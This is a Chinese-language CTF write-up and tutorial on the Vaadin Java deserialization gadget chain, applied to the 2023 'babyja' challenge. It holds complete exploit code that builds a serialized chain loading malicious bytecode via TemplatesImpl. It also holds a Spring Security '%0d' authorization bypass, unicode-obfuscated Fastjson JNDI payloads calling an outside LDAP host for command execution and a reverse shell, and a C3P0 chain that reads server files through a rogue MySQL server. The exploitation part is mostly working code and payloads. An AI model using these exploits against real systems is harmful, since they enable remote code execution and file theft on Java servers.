# Java安全 - Learning Vaadin Gadget From CTF

> **来源**: https://forum.butian.net/share/2860  
> **文章ID**: 2860

---

前言
==

本篇文章转载先知社区 作者Zjacky(本人) 原文链接为https://xz.aliyun.com/t/13941

要过年了忙得起飞大年初三就飞马来潜水去了于是为了不让身边的师傅卷死我就去看了下之前没打出来的CTF题目心血来潮来复现学习下，刚好遇到新的链子，就一并写篇博客记录下，标题很洋气，从CTF中学习Vaadin gadgets

‍

Vaadin链
=======

‍

Vaadin 可以理解为是一个平台吧，有UI，了解即可，Vaadin 的反序列化调用链其实蛮简单的，就是反射调用 `getter`​ 方法罢了

‍

依赖

```yaml
vaadin-server : 7.7.14
vaadin-shared : 7.7.14
```

‍

漏洞其实就三个类

‍

### NestedMethodProperty

`com.vaadin.data.util.NestedMethodProperty`​ 类可以理解为是一个封装属性方法的类，其构造方法如下

![image](images/attach-f30189d33bad7bb82554273a397eb22cf493b4a3.png)​

接收两个参数，一个是实例化的对象，一个是属性值。然后调用初始化方法将调用 `initialize`​ 方法获取实例类中的相关信息存放在成员变量中。跟进该初始化方法

![image](images/attach-5f5eebb1b3a6e1ad8b2a03bece34d7a5478a74cd.png)​

发现已经获取到了我们传入的属性值的getter方法

![image](images/attach-27c3d58e8c1f4bcbaf7dff62feb8bc8e270147f4.png)​

并且进行对象属性的一些赋值封装

![image](images/attach-a80a84c8a1a600611fbb5c869b824fafee4ed30c.png)​

然后这个`NestedMethodProperty`​ 类 存在 `getValue`​ 方法

将我们上述封装的`getMethods`​这个方法数组类进行遍历且调用里面的属性的方法名

![image](images/attach-0a721bfd3222386123e61babe576136f6ed8690a.png)​

‍

因此这个类又是可以触发 TemplatesImpl 的利用方式，所以找哪个类存在 能够触发`NestedMethodProperty#getvalue()`​去调用getter方法，于是找到下面的类

‍

### PropertysetItem

‍

触发类是 `com.vaadin.data.util.PropertysetItem`​ ，这个类实现了几个接口，初始化后能够对自己的map属性，list属性进行操作

数据存放在成员变量 map 中，想要获取相应属性时，则调用 `getItemProperty`​ 方法在 map 中获取，需要传入一个对象

‍

![image](images/attach-fa217758c07f743e71b9f06c0a69fa91a68fa8b7.png)​

‍

而这个类重点则是他存在`toString`​方法

![image](images/attach-63250800b005149ce27bbe6ed978d80146262b98.png)​

‍

从list中获取值然后去调用`getValue`​

![image](images/attach-fa496c3c3e61757729997e099af751a53a804f68.png)​

‍

那么这个list怎么赋值呢，可以关注`addItemProperty`​方法

![image](images/attach-24a27fc2568ee96ca253920f007b8cb1ad40c33f.png)​

将我们传入的id值传入

‍

断点看下这个​`getItemPropertyIds`​的返回值是什么

![image](images/attach-6a2f3e348b7b1640ab0a02db41a54f32fd1d1a1c.png)​

其实可以发现他返回的就是我们`list`​的内容

那之后取出list的内容后再从map中去找对应的值去调用我们的getvalue方法

![image](images/attach-ec9a3e6a9d2095155b2a2183ffe2378dfd84a718.png)​

‍

那么现在目的就是

1. list有一个需要调用他的getter方法的id
2. map也需要一个调用他的getter方法的id并且取出来的值为`NestedMethodProperty`​类来调用他的getvalue方法

那其实就已经非常好去拼接了

‍

最后的问题就是如何在反序列化的时候调用任意类的`Tostring`​方法了，而在我们的CC5当中就接触过这个类叫`BadAttributeValueExpException`​，他的反序列化是可以调用任意类的`ToString`​方法的，于是参考SU18师傅的EXP成功弹出计算机

‍

```java
package Vaadin;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Vaadin_Ser {

    public static void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {

        // 生成包含恶意类字节码的 TemplatesImpl 类
        byte[] payloads = Files.readAllBytes(Paths.get("D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class"));

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] {payloads});
        setFieldValue(templates, "_name", "zjacky");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        PropertysetItem pItem = new PropertysetItem();

        NestedMethodProperty nmprop = new NestedMethodProperty(templates, "outputProperties");
        pItem.addItemProperty("outputProperties", nmprop);

        // 实例化 BadAttributeValueExpException 并反射写入
        BadAttributeValueExpException exception = new BadAttributeValueExpException("zjacky");
        Field field     = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(exception, pItem);

//        serialize(exception);
unserialize("ser.bin");

    }
}

```

‍

![image](images/attach-5081a77d8be2055b23b1cb8f41b478f300820e63.png)​

‍

整个链代码量非常少，其实还是很简单的自己动手跟下即可非常容易理解

‍

CTFer
=====

这里学完这个之后来以2023年福建省赛黑盾杯的初赛babyja来进行案例分析，考点如下(其实这个题很多解法)

1. Fastjson 黑名单绕过 or 不出网应用
2. Spring Security 权限绕过
3. Vaadin反序列化链
4. C3P0二次反序列化

‍

2023闽盾杯初赛 babyja
----------------

目录结构

![image](images/attach-e233d61472dd1da2a851c178663d295fab16fb5b.png)​

查看`pom.xml`​

‍

![image](images/attach-bb41c71d7e65d05858e94897700c177912df414a.png)​

其实意图就很明显三个组件都能相互配合(马后炮)

‍

并且存在Spring Security的一个权限鉴权，先查看下`AuthConfig.class`​ 发现是用`regexMatchers`​来进行正则匹配路径，去查看下spring Security的版本为 5.6.3 ，而这里由于设计问题看他的控制器是随便什么都可以进入逻辑 相当于`admin/*`​ ，所以完全符合漏洞版本所以可以使用`%0d`​绕过

![image](images/attach-ea76048c4e9c2bc1904003124136952bfae906ff.png)​

直接访问302

![image](images/attach-0d52f6dffc0759e773f7c17c677881cebe2b1ce7.png)​

权限绕过后返回​`WellDone`​

![image](images/attach-7efc5a758cd6a4a7cd598dd210f51e77d03496e8.png)​

当然给出账号密码也是可以登录获取Session的

![image](images/attach-6041e2070c29ae36ea4b9e1495d0423748d02021.png)​

获取到Session `JSESSIONID=FC8D9FE4BBDAE0BC554377DB1CAFCBE8`​

发现成功执行

![image](images/attach-91ecd660476d2582721376a6f361366c9b2c0864.png)​

‍

再来查看控制器

![image](images/attach-4a264d18ef19b375a9a69ddf40e64718ca52f525.png)​

可以发现传入data这个json字符串然后进行鉴权并且给到`JSON.parse`​解析，其实可以想到绕过黑名单+fastjson打C3p0不出网这个思路，也可以直接打jndi注入吧，跟进`SecurityCheck`​

![image](images/attach-683dace3775c5e46b753fc5ffcabf2cb2ed0c45c.png)​

可以想到用16进制或者unicode来进行绕过黑名单，所以有以下打法

‍

### JNDI注入(出网+jdk低版本)

本地用的是jdk8u65

‍

```yaml
POST /admin/user%0d HTTP/1.1
Host: localhost:8080
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"

data={{urlenc(eyJAdHlwZSI6Ilx1MDA2M1x1MDA2Zlx1MDA2ZFx1MDAyZVx1MDA3M1x1MDA3NVx1MDA2ZVx1MDAyZVx1MDA3Mlx1MDA2Zlx1MDA3N1x1MDA3M1x1MDA2NVx1MDA3NFx1MDAyZVx1MDA0YVx1MDA2NFx1MDA2Mlx1MDA2M1x1MDA1Mlx1MDA2Zlx1MDA3N1x1MDA1M1x1MDA2NVx1MDA3NFx1MDA0OVx1MDA2ZFx1MDA3MFx1MDA2YyIsImRhdGFTb3VyY2VOYW1lIjoibGRhcDovLzEwNy4xNzQuMjI4Ljc5OjEzODkvQmFzaWMvQ29tbWFuZC9jYWxjIiwiYXV0b0NvbW1pdCI6dHJ1ZX0=)}}
```

‍

直接反弹shell即可

```json
{"@type":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","dataSourceName":"ldap://xxx:1389/Basic/ReverseShell/xxx/7979","autoCommit":true}
```

![image](images/attach-4c687e89067d0398423884dc1e05329530983f50.png)​

‍

当然除了直接打1.2.24的JNDI 也可以打C3P0的JNDI,只是需要用unicode或者16进制去绕过即可

```yaml
{"@type":"com.mchange.v2.c3p0.\u004a\u006e\u0064\u0069\u0052\u0065\u0066\u0043\u006f\u006e\u006e\u0065\u0063\u0074\u0069\u006f\u006e\u0050\u006f\u006f\u006c\u0044\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065","\u004a\u006e\u0064\u0069\u004e\u0061\u006d\u0065":"ldap://127.0.0.1:1389/Basic/Command/calc", "LoginTimeout":0}
```

‍

![image](images/attach-a5529e8251ccde96697f6a00969f962494808ee0.png)​

### 不出网打二次反序列化

C3P0打二次反序列化, 可以看到该题存在Vaadin的依赖，所以可以通过C3P0打Vaadin的反序列化，但是由于他把`TemplatesImpl`​的16进制也给ban了，这样子我们就没办法用C3P0打二次反序列化来使用`TemplatesImpl`​加载字节码了

![image](images/attach-62cc9380057471590529ee4d677a36c302bc55a0.png)​

所以只能另从别的思路来看，从始至终我们并没有去讨论题目的`bean`​目录，现在来看下

一个接口

![image](images/attach-11a57b5eb19ddb62afabda1c2dec1a6e6f309d08.png)​

‍

![image](images/attach-e984d7bc954e54f397848c23d9dce315ce92ef26.png)​

可以发现这里存在`getConnection`​方法，而在Vaadin分析中可以得知，其链子一部分是可以调用任意属性的getter方法的，所以在这里思路就是：调用`getConnection`​方法来控制JDBC来连恶意的mysql从而读取flag，而已的mysql为

[https://github.com/fnmsd/MySQL\_Fake\_Server](https://github.com/fnmsd/MySQL_Fake_Server)

‍

根据Vaadin的exp来修改下即可，最后的exp(这里参考大头Sec的Wp)为

```java
import com.ctf.bean.MyBean;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;

public class Vaadin_Ser {

    public static void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] ser(Object obj) throws Exception{
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bos);
        out.writeObject(obj);
        out.flush();
        return bos.toByteArray();
    }
    public static String bytesToHexString(byte[] bArray) {
        StringBuffer sb = new StringBuffer(bArray.length);
        for (byte b : bArray) {
            String sTemp = Integer.toHexString(255 & b);
            if (sTemp.length() < 2) {
                sb.append(0);
            }
            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }

    public static void main(String[] args) throws Exception {

        MyBean myBean =new MyBean();
        myBean.setDatabase("mysql://xxx:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=65536&allowUrlInLocalInfile=true#");

        PropertysetItem pItem = new PropertysetItem();

        NestedMethodProperty nmprop = new NestedMethodProperty(myBean, "Connection");
        pItem.addItemProperty("Connection", nmprop);

        // 实例化 BadAttributeValueExpException 并反射写入
        BadAttributeValueExpException exception = new BadAttributeValueExpException("zjacky");
        Field field     = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(exception, pItem);

        // 序列化并输出 HEX 序列化结果
        System.out.println(bytesToHexString(ser(exception)));

    }
}
```

这里有一个很重要的东西，就是包名一定要得对(CTFer的痛)

![image](images/attach-eda0d01179a7a21ded9f2a052d3bf1065adc4e3a.png)​

```java
mysql://1.1.1.1:3306/test?user=fileread_file:///.&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=65536&allowUrlInLocalInfile=true#

mysql://1.1.1.1:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=65536&allowUrlInLocalInfile=true#
```

![image](images/attach-84ec215bddbe2bac20f3f0e762ba4540d7480eb2.png)​

‍
